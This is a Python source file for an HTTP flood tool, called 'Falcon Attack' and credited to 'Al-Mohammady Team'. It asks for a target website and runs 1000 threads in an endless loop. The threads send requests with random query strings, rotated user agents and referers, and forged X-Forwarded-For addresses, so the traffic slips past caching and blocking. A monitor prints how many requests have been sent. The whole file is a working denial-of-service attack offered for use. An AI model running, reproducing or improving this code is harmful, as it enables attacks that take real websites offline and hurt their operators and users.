import urllib.request
import concurrent.futures
import random
import re
import sys
import os
from colorama import Fore
import threading
from halo import Halo
from logo import logo
from ipFake import random_ipFake
from userAgent import uagent

# -------------------------
global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
__version__ = '8.0 BETA'
__author__ = "Al-Mohammady Team."
__method__ = 'HTTP V 2'


def inc_counter():
    global request_counter
    request_counter += 1


def set_flag(val):
    global flag
    flag = val


def set_safe():
    global safe
    safe = 1


def referer_list():
    global headers_referers
    with open('Tools/ref.txt', 'r') as file:
        data = file.readlines()
        headers_referers = [item.strip() for item in data if item.strip()]  # تأكد من إزالة أي فراغات إضافية
    return headers_referers


def buildblock(size):
    return ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(size))


def usage():
    spinner = Halo()
    spinner.succeed(f'Method : {__method__}.')
    spinner.stop()
    print('-' * 40)


def httpcall(url):
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    payload = buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    request_url = url + param_joiner + payload
    headers = {
        'User-Agent': random.choice(uagent),
        'Cache-Control': 'no-cache',
        'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
        'Accept-Charset': 'iso-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': random.choice(referer_list()),
        'Keep-Alive': str(random.randint(120, 130)),
        'Connection': 'keep-alive',
        'Host': host,
        'X-Forwarded-For': random_ipFake()
    }

    try:
        # إرسال الطلب
        req = urllib.request.Request(request_url, headers=headers)
        urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA} Response Code !")
        code = e.code
    except urllib.error.URLError as e:
        print(f"{Fore.RED}Error: {e.reason}")
        sys.exit()
    else:
        inc_counter()

    return code


def http_caller(url):
    while flag < 2:
        code = httpcall(url)
        if code == 500 and safe == 1:
            pass


def monitor_thread():
    sent = 0
    previous = request_counter
    while flag == 0:
        if previous + 100 < request_counter and previous != request_counter:
            sent += 1
            print(f"{Fore.YELLOW}[ {sent} ] {Fore.GREEN}Request Sent! Payload Size : {Fore.YELLOW}{request_counter}.")
            previous = request_counter
    if flag == 2:
        print(f"\n{Fore.RED}-- Falcon Attack Finish --{Fore.RESET}")


if __name__ == "__main__":
    os.system('clear')
    logo()
    usage()

    url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target  : ")

    if url.count("/") == 2:
        url = url + "/"

    m = re.search('(https?\://)?([^/]*)/?.*', url)
    host = m.group(2)

    safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Mode < safe > (yes / no) : ").lower()
    if safe_option == "yes":
        set_safe()

    # Continuous request sending with while True
    while True:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
            future_to_url = {executor.submit(http_caller, url): url for _ in range(1000)}

            # Starting the monitor thread
            t = threading.Thread(target=monitor_thread)
            t.start()

            # Waiting for all tasks to complete
            for future in concurrent.futures.as_completed(future_to_url):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error in thread execution: {e}")

            # Waiting for the monitor thread to finish
            t.join()